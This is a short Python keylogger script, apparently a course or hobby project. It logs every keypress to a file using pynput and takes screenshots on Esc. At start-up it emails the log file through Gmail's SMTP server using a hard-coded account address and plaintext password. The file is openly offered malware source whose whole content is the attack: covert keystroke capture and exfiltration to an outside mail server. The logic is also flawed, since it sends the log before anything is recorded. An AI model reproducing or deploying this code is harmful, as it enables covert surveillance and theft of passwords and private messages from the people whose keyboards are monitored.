# Keylogger

# Libraries
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
from pynput.keyboard import Listener
import logging
from PIL import ImageGrab
from datetime import datetime


log_directory = ""
logging.basicConfig(filename="log_results.txt", level=logging.DEBUG)

sender_email = "tnm031keylogger@gmail.com"
receiver_email = "tnm031keylogger@gmail.com"
password = "tnm031pizza"
filename = "log_results.txt"
subject = "Keys logged"
body = "This is an email with attachment sent from Python"

message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject

message.attach(MIMEText(body, "plain"))


def screenshot(image_name):
    im = ImageGrab.grab()
    im.save(image_name)


with open(filename, "rb") as attachment:
    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

encoders.encode_base64(part)

message.attach(part)
text = message.as_string()

context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, text)


def on_press(key):
    logging.info(str(key))
    print(key)
    if key == keyboard.Key.esc:
        screenshot(str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + '.png')


if __name__ == '__main__':
    with Listener(on_press=on_press) as listener:
        listener.join()
